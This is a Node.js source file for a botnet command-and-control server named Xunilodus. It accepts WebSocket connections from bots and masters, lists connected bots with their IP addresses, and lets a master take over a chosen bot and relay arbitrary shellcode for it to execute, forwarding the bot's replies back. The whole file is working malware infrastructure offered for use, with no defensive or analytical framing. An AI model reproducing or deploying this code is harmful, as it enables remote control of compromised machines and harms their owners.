#!/usr/bin/env node

//#region [ IMPORTS ]

const md5 = require('md5');
const http = require('http');
const info = require('./info');
const nonce = require('nonce');
const WebSockets = require('websocket');
const { BotnetFrame, MessageType, SenderType, StatusCode, CommandFlags, CommandID } = require('./sfxtp');
const yargs = require('yargs');

//#endregion

var argv = yargs.scriptName("Xunilodus-Server")
  .usage("Usage: $0 --port=port_value")
  .example(
    "$0 --port=44335",
    "Run the botnet server of Xunilodus on port 44335."
  ).command('port [port]', 'The port to listen for incoming connections.', (yargs) => {
    return yargs.positional('port', {
      description: 'The port to listen for incoming connections.',
      demandOption: "The port of server is required.",
      type: 'number',
    })
  }).help().alias('help', 'h').argv;

if (!argv['port']){
  console.log('[?] Parameter --port not specified. Presuming default 44335');
  argv['port'] = 44335;
}

const server = http.createServer((req, res) => { res.writeHead(403); return res.end(); });

server.listen(argv['port'], function () {
  console.log(`[${(new Date()).toLocaleString()}] Xunilodus Server is listening on port ${argv['port']}.`);
});

//#region [ CONSTANTS ]

const MaxSingleHostsConnections = 5;
const WebSockServer = new WebSockets.server({
  httpServer: server,
  maxReceivedFrameSize: 65536,
  maxReceivedMessageSize: 65536
});

//#endregion

//#region [ VARIABLES ]

var OpennedSockets = 0;
var MaxOpennedSockets = 32;
var SocketTable = [];
var ImpersonationTable = [];

//#endregion

//#region [ UTILITY FUNCTIONS ]

function IsAllowedOrigin(origin) {
  return true;
}

function ReadSocketByFingerprint(fingerprint) {
  for (let idx = 0; idx < SocketTable.length; idx++) {
    if (SocketTable[idx].Fingerprint == fingerprint)
      return SocketTable[idx];
  }
  return null;
}

function ApplyDepersonification(srcFingerprint){
  return !!(ImpersonationTable = ImpersonationTable.filter((obj) => { return (obj.SourceFingerprint != srcFingerprint); }));
}

function VerifyImpersonation(srcFingerprint, destFingerprint){
  for (let x = 0; x < ImpersonationTable.length; x++)
    if ((ImpersonationTable[x].SourceFingerprint == srcFingerprint) && ((ImpersonationTable[x].DestinationFingerprint == destFingerprint) || !destFingerprint))
      return true;
  return false;
}

function ApplyImpersonation(srcFingerprint, destFingerprint){
  if (VerifyImpersonation(srcFingerprint, null) || !ReadSocketByFingerprint(destFingerprint))
    return false;
  ImpersonationTable.push({ SourceFingerprint: srcFingerprint, DestinationFingerprint: destFingerprint });
  return true;
}

//#endregion

//#region [ TUNNELING FUNCTIONS ]

/**
 * @param {string} srcFingerprint The SFBTP datagram
 * @param {BotnetFrame} frame The SFBTP datagram
 */
function OnFrameReceived(srcFingerprint, frame){
  let Socket = ReadSocketByFingerprint(srcFingerprint);
  if (Socket === null)
    return;
  switch (frame.MessageType){
    case MessageType.QUERY:{

      switch (frame.SenderType){
        case SenderType.MASTER:{

          switch (frame.StatusCode){
            case StatusCode.QUERY_SENT:{
              let Data;
              let Status = StatusCode.RESPONSE_SENT;
              let Type = MessageType.RESPONSE;
              switch (frame.CommandID){
                case CommandID.IMPERSONATE:{
                  if (ApplyImpersonation(srcFingerprint, frame.TargetFingerprint.toString(16).toUpperCase())){
                    Data = { "message": info.command_messages.IMPERSONATE.success }
                  } else {
                    Data = { "message": info.command_messages.IMPERSONATE.failed  }
                    Status = StatusCode.ERROR_STATUS;
                  }
                  Data = JSON.stringify(Data);
                  Socket.send(
                    BotnetFrame.build(
                      Type, frame.SequenceID,
                      SenderType.COMMAND_CONTROL,
                      parseInt(srcFingerprint, 16),
                      frame.CommandFlags, 0, Status,
                      frame.CommandID, 0xababcdcd, Data
                    ).Bytes
                  );
                } break;
                case CommandID.DEPERSONATE:{
                  if (ApplyDepersonification(srcFingerprint)){
                    Data = { "message": info.command_messages.DEPERSONATE.success }
                  } else {
                    Data = { "message": info.command_messages.DEPERSONATE.failed  }
                    Status = StatusCode.ERROR_STATUS;
                  }
                  Data = JSON.stringify(Data);
                  Socket.send(
                    BotnetFrame.build(
                      Type, frame.SequenceID,
                      SenderType.COMMAND_CONTROL,
                      parseInt(srcFingerprint, 16),
                      frame.CommandFlags, 0, Status,
                      frame.CommandID, 0xababcdcd, Data
                    ).Bytes
                  );
                } break;
                case CommandID.EXECUTE_SHELLCODE:{
                  let DestinationSocket;
                  if (VerifyImpersonation(srcFingerprint, frame.TargetFingerprint.toString(16).toUpperCase())){
                    Status = StatusCode.QUERY_SENT;
                    Type = MessageType.QUERY;
                    Data = frame.Payload;
                    DestinationSocket = ReadSocketByFingerprint(frame.TargetFingerprint.toString(16).toUpperCase());
                  } else {
                    Status = StatusCode.ERROR_STATUS;
                    Type = MessageType.RESPONSE;
                    Data = { "message": info.command_messages.EXECUTE_SHELLCODE.failed }
                    DestinationSocket = Socket;
                  }
                  DestinationSocket.send(
                    BotnetFrame.build(
                      Type, frame.SequenceID,
                      SenderType.COMMAND_CONTROL,
                      parseInt(srcFingerprint, 16),
                      frame.CommandFlags, 0, Status,
                      frame.CommandID, 0xababcdcd, Data
                    ).Bytes
                  );
                } break;
              }
            } break;
            case StatusCode.QUERY_INFO:{
              let Data;
              switch (frame.CommandID){
                case CommandID.HELP:{
                  Data = JSON.stringify(info.command_list);
                } break;
                case CommandID.LIST_BOTS:{
                  Data = [];
                  for (let k = 0; k < SocketTable.length; k++)
                    Data.push({
                      "RemoteAddress": SocketTable[k].remoteAddress,
                      "Fingerprint": SocketTable[k].Fingerprint,
                      "IsOwnDevice": (SocketTable[k].Fingerprint == srcFingerprint)
                    });
                  Data = JSON.stringify(Data);
                } break;
              }
              Socket.send( 
                BotnetFrame.build(
                  MessageType.RESPONSE,
                  frame.SequenceID,
                  SenderType.COMMAND_CONTROL,
                  parseInt(srcFingerprint, 16), 
                  frame.CommandFlags, 0, 
                  StatusCode.RESPONSE_INFO,
                  frame.CommandID, 0xababcdcd, Data
                ).Bytes
              );
            } break;
            case StatusCode.QUERY_AND_WAIT:{
              //Not supported yet
            } break;
          }

        } break;
        case SenderType.BOT:{
          //Bots cannot execute queries for security purposes
        } break;
      }

    } break;
    case MessageType.RESPONSE:{

      switch (frame.SenderType){
        case SenderType.MASTER:{
          //Masters cannot respond queries for security purposes
        } break;
        case SenderType.BOT:{

          switch (frame.StatusCode) {
            case StatusCode.RESPONSE_SENT:{
              let DestinationSocket = ReadSocketByFingerprint(frame.TargetFingerprint.toString(16).toUpperCase());
              DestinationSocket.send(
                BotnetFrame.build(
                  MessageType.RESPONSE, frame.SequenceID,
                  SenderType.COMMAND_CONTROL,
                  parseInt(srcFingerprint, 16),
                  frame.CommandFlags, 0, StatusCode.RESPONSE_SENT,
                  frame.CommandID, 0xababcdcd, frame.Payload
                ).Bytes
              );
            } break;
            case StatusCode.ERROR_STATUS:{
              let DestinationSocket = ReadSocketByFingerprint(frame.TargetFingerprint.toString(16).toUpperCase());
              DestinationSocket.send(
                BotnetFrame.build(
                  MessageType.RESPONSE, frame.SequenceID,
                  SenderType.COMMAND_CONTROL,
                  parseInt(srcFingerprint, 16),
                  frame.CommandFlags, 0, StatusCode.ERROR_STATUS,
                  frame.CommandID, 0xababcdcd, frame.Payload
                ).Bytes
              );
            } break;
            case StatusCode.RESPONSE_WAIT_FRAGMENT:{
              //Not supported yet
            } break;
            case StatusCode.RESPONSE_WAIT_FRAGMENT || StatusCode.RESPONSE_SENT:{
              //Not supported yet
            } break;
          }

        } break;
      }

    } break;
  }
}

//#endregion

//#region [ SOCKET LISTENERS ]

WebSockServer.on('connect', (connection) => {
  OpennedSockets++;
  connection.on('message', (message) => {
    if (message.type == 'binary') {
      let buffer = message.binaryData;
      try{
        OnFrameReceived(connection.Fingerprint, new BotnetFrame(buffer));
      } catch (e){
        connection.drop(403, 'Invalid buffer received');
      }
    } else {
      connection.drop(403, 'Invalid buffer received');
    }
  });
});

WebSockServer.on('request', (request) => {
  (IsAllowedOrigin(request.origin) ? () => {
    if (OpennedSockets == MaxOpennedSockets) {
      request.reject(503, 'Maximum concurrent socket connections limit hit');
    }
    else {
      let NumOfConnections = 0;
      for (let scki = 0; scki < SocketTable.length; scki++) {
        if ((SocketTable[scki].connected == true) && (SocketTable[scki].remoteAddress == request.remoteAddress)) {
          NumOfConnections++;
        }
      }
      if (NumOfConnections < MaxSingleHostsConnections) {
        let Socket = request.accept();
        Socket.Fingerprint = md5(request.key + nonce(128)()).substring(0, 8).toUpperCase();
        SocketTable.push(Socket);
        console.log(`[+] Client [${Socket.Fingerprint}] connected.`);
      } else {
        request.reject(403, 'Maximum concurrent single hosts connections limit hit');
      }
    }
  } : () => {
    request.reject(403, 'Access Denied');
  })();
});

WebSockServer.on('close', (connection, reasonCode, desc) => {
  console.log(`[-] Client [${connection.Fingerprint}] disconnected.`);
  SocketTable = SocketTable.filter((sock, _idx, _socktable) => {
    return !((sock.Fingerprint == connection.Fingerprint));
  });
  if (OpennedSockets > 0)
    OpennedSockets--;
});

//#endregion